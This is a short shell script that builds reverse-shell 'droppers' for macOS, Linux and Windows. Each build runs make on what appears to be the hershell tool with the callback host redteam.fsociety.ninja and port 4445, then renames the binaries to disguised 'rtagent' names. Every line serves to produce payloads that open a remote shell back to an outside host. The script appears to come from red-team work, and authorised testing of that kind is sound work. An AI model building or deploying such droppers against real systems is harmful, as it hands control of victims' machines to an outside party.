#!/bin/sh

# Build MacOS Droppers

make macos64 LHOST=redteam.fsociety.ninja LPORT=4445
mv hershell droppers/rtagent-macos64

make macos32 LHOST=redteam.fsociety.ninja LPORT=4445
mv hershell droppers/rtagent-macos32


# Build Linux Droppers

make linux64 LHOST=redteam.fsociety.ninja LPORT=4445
mv hershell droppers/rtagent-linux64

make linux32 LHOST=redteam.fsociety.ninja LPORT=4445
mv hershell droppers/rtagent-linux32

# Build Windows Droppers

make windows64 LHOST=redteam.fsociety.ninja LPORT=4445
mv hershell.exe droppers/rtagent-windows64.exe

make windows32 LHOST=redteam.fsociety.ninja LPORT=4445
mv hershell.exe droppers/rtagent-windows32.exe
